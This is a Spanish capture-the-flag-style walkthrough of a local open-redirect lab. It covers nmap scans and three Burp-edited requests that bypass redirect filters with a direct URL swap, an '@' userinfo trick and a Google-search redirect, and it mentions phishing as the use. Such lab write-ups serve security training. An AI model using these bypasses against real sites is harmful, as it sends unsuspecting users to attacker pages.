---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Redirection BugBountyLabs (Principiante)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_redirection.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_redirection.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina redirection, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina redirection es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 12:55 CET
Nmap scan report for app.dl (172.17.0.2)
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Laboratorio de Open Redirect
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

Vemos que hay un puerto `80` y si entramos a la pagina web veremos varios laboratorios de `Open Redirect`, por lo que vamos a ir haciendolos uno por uno.

## LAB 1:

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

Veremos que con ese boton nos lleva a `google.com` por lo que vamos abrir `BurpSuite` y capturar esa peticion de redireccion, veremos lo siguiente:

```
GET /laboratorio1/redirect.php?url=http://google.com HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio1/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Vemos que se esta poniendo directamente en la `URL` la redireccion a `google.com`, pero si nosotros ponemos por ejemplo `example.es` quedando de la siguiente forma:

```
GET /laboratorio1/redirect.php?url=http://example.es HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio1/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Y si la enviamos, y vamos a la pagina veremos que nos redirije de forma correcta:

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

Por lo que habremos terminado el primero `laboratorio`.

## LAB 2:

<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

Veremos si le damos al boton de `Google` nos lleva a `google.com`, pero si intentamos hacer lo mismo de antes, reemplazando la `URL` mediante `BurpSuite` por la de `example.es` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos lo esta bloqueando, pero si realizamos algun `Bypass` poniendo un `@` por delante para que se piense el servidor que es un `subdominio` de `google.es` y nos llevara a dicha `URL` que le metamos.

Capturaremos la peticion con `BurpSuite` y veremos lo siguiente:

```
GET /laboratorio2/redirect.php?url=https://www.google.com HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio2/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora le pondremos el `payload` de forma `bypasseada` quedando de la siguiente forma:

```
GET /laboratorio2/redirect.php?url=https://www.google.com@example.es HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio2/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora si enviamos la peticion y volvemos a la pagina veremos que nos ha llevado de forma correcta a `example.es`.

<figure><img src="../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Por lo que habremos terminado el `laboratorio`.

## LAB 3:

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

Veremos que si le damos al boton de `Ir a Google` nos llevara a `google.com`, pero si intentamos cambiar directamente la `URL` mediante la peticion con `BurpSuite` veremos que no funciona y nos aparece lo mismo de antes:

<figure><img src="../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

Pero si intentamos poner el `@` para hacer creer que es un `subdominio` nos aparecera el mismo mensaje de bloqueo, por lo que haremos que busque el navegador la`URL` en este caso del atacante y esto tambien se considera un `Open redirect` ya que con esta tecnica mediante un poco de `phising` puede el usuario pinchar en el enlace malicioso.

Vamos abrir `BurpSuite` capturar la peticion y dejaremos la peticion de la siguiente forma:

```
GET /laboratorio3/redirect.php?url=https://www.google.com/search?q=example.com HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio3/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Poniendo el `?q=` despues de la `URL` veremos lo siguiente cuando la enviemos:

<figure><img src="../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando de forma correcta y nos lleva directamente a la `URL` maliciosa para que el usuario pinche.
